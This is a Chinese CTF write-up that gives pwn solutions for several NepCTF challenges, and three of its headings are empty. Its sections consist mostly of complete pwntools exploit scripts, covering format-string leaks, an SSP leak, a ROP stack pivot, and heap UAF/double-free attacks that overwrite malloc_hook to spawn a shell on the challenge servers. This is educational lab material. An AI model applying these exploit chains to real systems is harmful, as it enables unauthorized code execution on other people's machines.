

## 签到题-小红花：

存在堆溢出，但是好像用不到，直接修改写入堆块 + 0x10出的一字节为backdoor就可以

```
pwndbg> x/10gx 0x56471a83e250
0x56471a83e250:	0x0000000000000000	0x0000000000000021
0x56471a83e260:	0x0000000000000000	0x0000000000000000
0x56471a83e270:	0x000056471a25e3ab	0x0000000000020d91
```

因为写入的地址为：

```
.data:0000000000004020 off_4020        dq offset sub_125D      ; DATA XREF: main+2E↑o
.data:0000000000004028                 dq offset sub_15B7
.data:0000000000004030                 dq offset sub_13AB
.data:0000000000004038                 dq offset sub_1310
.data:0000000000004040                 dq offset sub_1558
.data:0000000000004048                 dq offset sub_1446
.data:0000000000004050                 dq offset sub_15FE
.data:0000000000004058                 dq offset sub_1698
.data:0000000000004060                 dq offset sub_1651
```

```
pwndbg> x/10gx 0x55960a20e250
0x55960a20e250:	0x0000000000000000	0x0000000000000021
0x55960a20e260:	0x0000000000000000	0x0000000000000000
0x55960a20e270:	0x0000559609280310	0x0000000000020d91
0x55960a20e280:	0x0000000000000000	0x0000000000000000
0x55960a20e290:	0x0000000000000000	0x0000000000000000
```

而我们需要的backdoor地址为14e1，所以有1/9概率修改成功，爆破就完了

exp:

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-
from pwn import *
context(arch='amd64',endian='el',os='linux')
content.log_level='debug'
debug = 1
if debug == 1:
	p = process("./xhh")
else:
	p = remote("node2.hackingfor.fun",37164)

gdb.attach(p, 'b *$rebase(0x0016CB)')
pd = '\x00'*0x10 + '\xe1'
p.send(pd)
p.interactive()
```

flag:

```
Nep{6fde57b7-f7b4-473f-a563-ab68afdf7ca2}
```

## easystack:

参考jarvisoj的smash

ssp leak

通过覆盖 `__stack_chk_fail` 的 ` __libc_message`第二个参数为flag地址

造成ssp 执行flag

flag被写入了0x6CDE20:

```
.text:00000000004009AE ; __unwind {
.text:00000000004009AE                 push    rbp
.text:00000000004009AF                 mov     rbp, rsp
.text:00000000004009B2                 sub     rsp, 10h
.text:00000000004009B6                 mov     esi, 0
.text:00000000004009BB                 mov     edi, offset aFlag ; "./flag"
.text:00000000004009C0                 mov     eax, 0
.text:00000000004009C5                 call    sub_43FEF0
.text:00000000004009CA                 mov     [rbp+var_4], eax
.text:00000000004009CD                 mov     eax, [rbp+var_4]
.text:00000000004009D0                 mov     edx, 30h ; '0'
.text:00000000004009D5                 mov     esi, offset unk_6CDE20
.text:00000000004009DA                 mov     edi, eax
.text:00000000004009DC                 mov     eax, 0
.text:00000000004009E1                 call    sub_43FF50
.text:00000000004009E6                 nop
.text:00000000004009E7                 leave
```

exp:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
debug = 2
context(arch='amd64', endian='el', os='linux')
context.log_level = 'debug'
if debug == 1:
    p = process('./easystack')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    one = [0x45226, 0x4527a, 0xf0364, 0xf1207]
else:
    p = remote('node2.hackingfor.fun',33947)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    one = [0xe237f,0xe2383,0xe2386,0x106ef8]
elf = ELF('./easystack', checksec=False)
#gdb.attach(p, 'b *0x400A7A\nc')

pd = p64(0x6CDE20)*0x200
p.sendline(pd)

p.interactive()
```



## scmt:

存在格式化字符串漏洞，泄露栈上值，满足cmp执行/bin/sh

gdb调试可以看到，

```
   0x400b57    mov    rax, qword ptr [rbp - 0x20]
 ► 0x400b5b    cmp    qword ptr [rbp - 0x10], rax
   0x400b5f    je     0x400b75 <0x400b75>
   
rbp = 0x7ffe983983f0

pwndbg> x/10gx 0x7ffe983983e0
0x7ffe983983e0:	0x00000000008450af	0xd278bcfcb6ebb700
0x7ffe983983f0:	0x00000000006cb018	0x0000000000400de6
0x7ffe98398400:	0x0000038000000380	0x0000000100000380
0x7ffe98398410:	0x00007ffe98398528	0x0000000000400aa4
0x7ffe98398420:	0x00000000004002c8	0x02ed6e171fe67fd8
```

格式化字符串内：

```
pwndbg> stack 30
00:0000│ rsp  0x7ffe983983c8 —▸ 0x400b37 ◂— mov    edi, 0x4a1e58
01:0008│      0x7ffe983983d0 ◂— 0xffffffff
02:0010│      0x7ffe983983d8 —▸ 0x7ffe983983d0 ◂— 0xffffffff
03:0018│      0x7ffe983983e0 ◂— 0x8450af
04:0020│      0x7ffe983983e8 ◂— 0xd278bcfcb6ebb700
05:0028│ rbp  0x7ffe983983f0 —▸ 0x6cb018 —▸ 0x43bc80 ◂— mov    rcx, rsi
06:0030│      0x7ffe983983f8 —▸ 0x400de6 ◂— mov    edi, eax
07:0038│      0x7ffe98398400 ◂— 0x38000000380
08:0040│      0x7ffe98398408 ◂— 0x100000380

pwndbg> fmtarg 0x7ffe983983e0
The index of format argument : 9 ("\%8$p")
```

exp:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
debug = 1
context(arch='amd64', endian='el', os='linux')
context.log_level = 'debug'

if debug == 1:
    p = process('./scmt')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    one = [0x45226, 0x4527a, 0xf0364, 0xf1207]
else:
    p = remote('node2.hackingfor.fun', 35079)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    one = [0xe237f,0xe2383,0xe2386,0x106ef8]
elf = ELF('./scmt', checksec=False)


gdb.attach(p, 'b *0x400B32\n')
pd = '%8$p'
p.sendlineafter('name:\n', pd)

p.recvuntil('Welcome!!!')

num = int(p.recvline(), 16)

p.sendlineafter('number:\n', str(num))
p.interactive()

```

flag:

```
Nep{2b748cd8-1d2c-471a-a20b-04361be2f720}
```



## easypwn:

`ps：binLep师傅的做法 yyds`

利用的是snprintf格式化字符串漏洞：

```
  snprintf(v2, 7uLL, &s);
```

在snprintf传参时，没有给出第四个参数，但是snprintf认为因该有第四个参数，所以会读入上一个格式化字符串在内存中的映像

也就是：

```
 printf("welcome to NepCTF! %s\n", &s);
```

可以用爆破栈迁移打

snprintf 可以覆盖 rbp 的低字节为 \x00，用提前布置好的栈布局可以使栈迁移到 bss 上然后不断用 leave ret 迁移，先用 read 扩大输入范围，然后泄露，再提权

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
debug = 1
# context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

while True:
    try:
        if debug == 1:
            p = process('./easypwn')
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
            one = [0x4f3d5, 0x4f432, 0x10a41c]
        else:
            p = remote('node2.hackingfor.fun', 37207)
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
            one = [0x4f3d5, 0x4f432, 0x10a41c]

        elf = ELF('./easypwn', checksec=False)
        got_puts = elf.got['puts']
        plt_puts = elf.plt['puts']
        plt_read = elf.plt['read']
        plt_alarm = elf.plt['alarm']
        rop1 = 0x0000000000400be3  # pop rdi ; ret
        rop2 = 0x0000000000400a1f  # leave ; ret
        rop3 = 0x0000000000400be1  # pop rsi ; pop r15 ; ret
        rop4 = 0x00000000004007c8  # pop rbp ; ret

        pd = p64(0x6020c8)
        pd += p64(rop2)
        pd += p64(0x602128)
        pd += p64(rop1)
        pd += p64(0)
        pd += p64(rop2)
        pd += p64(0x602158)
        pd += p64(rop2)
        p.sendafter('teamname: ', pd)
        pd = '%22$hhn'
        p.sendafter('name', pd)

        pd = '\x00' * 0x07
        pd += p64(0x6020f0)
        pd += p64(rop3)
        pd += p64(0x602150)
        pd += p64(0)
        pd += p64(plt_read)
        info(hex(len(pd)))
        p.sendafter('duction\n', pd)

        sleep(0.5)
        pd = p64(rop1)
        pd += p64(got_puts)
        pd += p64(plt_puts)
        pd += p64(rop1)
        pd += p64(0)
        pd += p64(rop3)
        pd += p64(0x602198)
        pd += p64(0)
        pd += p64(plt_read)
        p.sendafter('\n', pd)

        libc.address = u64(p.recv(6, timeout=0.5).ljust(8, '\x00')) - libc.sym['puts']
        success('libc.address = ' + hex(libc.address))

        if libc.address & 0xff != 0:
            raise EOFError
        # gdb.attach(p, 'b *0x400be4\nc')
        pd = p64(rop4)
        pd += p64(0x602500)
        pd += p64(libc.address + one[1])
        p.sendafter('\n', pd)
        p.interactive()
        p.close()
    except EOFError:
        p.close()
        continue

```



## soooooeasy:

有UAF，无show，所以需要爆破stdout泄露libc，最近见的题目也挺多 

泄露libc后直接double free改malloc_hook为one 再触发double free提权

exp:

```python
# -*- coding:utf-8 -*-
from pwn import *

context(arch='amd64', endian='el', os='linux')
context.log_level = 'debug'
debug = 2
if debug == 1:
    p = process("./pwn")
else:
    p = remote("node2.hackingfor.fun",30486)

elf = ELF("./pwn", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
one = [0x45226, 0x4527a, 0xf0364, 0xf1207]


def add(length,name,color):
    p.recvuntil("Your choice :")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(length))
    p.recvuntil(":")
    p.send(name)
    p.recvuntil(":")
    p.sendline(color)
def free(idx):
    p.recvuntil("Your choice :")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))


def pwn():
    add(0x60, 'a' * 8, 'a' * 8)
    add(0x60, 'a' * 8, 'a' * 8)
    add(0xf0, 'a' * 8, 'a' * 8)
    add(0x60, 'a' * 8, 'a' * 8)
    add(0x60, 'a' * 8, 'a' * 8)
    free(2)
    add(0x20, '\x00', 'e' * 8)
    add(0x60, p16(0x25dd), 'f' * 8)
    free(0)
    free(3)
    free(0)
    # gdb.attach(r)
    add(0x60, p8(0x00), '1' * 8)
    add(0x60, p8(0x00), '1' * 8)
    add(0x60, p8(0x00), '1' * 8)
    # add(0x60,p8(0x00),'1'*8)
    add(0x60, p8(0x00), '1' * 8)
    pay = 0x33 * 'A' + p64(0xfbad1800) + p64(0) * 3 + '\x00'
    p.recvuntil("Your choice :")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(0x60))
    p.send(pay)
    stderr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    print hex(stderr)
    libc_base = stderr+0x20 - libc.sym['_IO_2_1_stdout_']
    print hex(libc_base)
    p.recvuntil(":")
    p.sendline('aaaa')
    libc_base = stderr + 0x20 - libc.sym['_IO_2_1_stdout_']
    one = [0x45226, 0x4527a, 0xf0364, 0xf1207]
    onegadget = libc_base + one[2]
    malloc_hook = stderr - 0xaf0
    #gdb.attach(p, "b *$rebase(0x0E25)")
    print hex(malloc_hook)  # get shell
    free(7)
    free(8)
    free(7)
    add(0x60, p64(malloc_hook - 0x23), 'b')
    add(0x60, 'a', 'a')
    add(0x60, 'a', 'a')
    payload = 'a' * 0x13 + p64(onegadget)
    add(0x60, payload, 'd')
    free(0)
    free(0)
    p.interactive()

while 1:
    try:
        pwn()
    except Exception:
        p.close()
        p = remote("node2.hackingfor.fun",30486)


```



## superpower:



## Null_fxck:



## escape:



